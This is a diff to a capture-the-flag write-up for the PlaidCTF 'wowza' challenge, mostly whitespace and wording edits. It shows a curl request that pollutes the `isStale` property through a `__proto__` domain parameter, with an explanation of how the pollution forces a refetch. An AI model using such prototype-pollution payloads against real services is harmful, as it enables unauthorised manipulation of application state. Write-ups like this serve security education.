@@ -265,7 +265,7 @@ Now we need to run a query on the site search server to achieve the prototype po
 
 ```shell
 ╭─zoey@parrot ~/sec/plaidctf/wowza ‹main*› 
-╰─$ curl 'http://wowza.pwni.ng:6285/?domain=__proto__&q=isStale'                                                                                                                                                127 ↵
+╰─$ curl 'http://wowza.pwni.ng:6285/?domain=__proto__&q=isStale'
 <html>
     <head>
         <!-- I submit for your consideration that this is not an XSS problem -->
@@ -290,7 +290,7 @@ Now we need to run a query on the site search server to achieve the prototype po
 </html>
 ```
 
-If things went properly, the request to the search console for the `__proto__` domain and site should have worked, and `isStale` should have been polluted with a value of `[]`, which is truthy.  So now when you make a search on your valid domain that returns a result, there should be a refetch.  When we run the following search:
+If things went properly, the request to the search console for the `__proto__` domain and site should have worked, and `isStale` should have been polluted with a value of `[]`, which is truthy.  So now when you make a search on any valid domain that returns a result, there should be a refetch.  When we run the following search:
 
 ```shell
 ╭─zoey@parrot ~/sec/plaidctf/wowza ‹main*› 
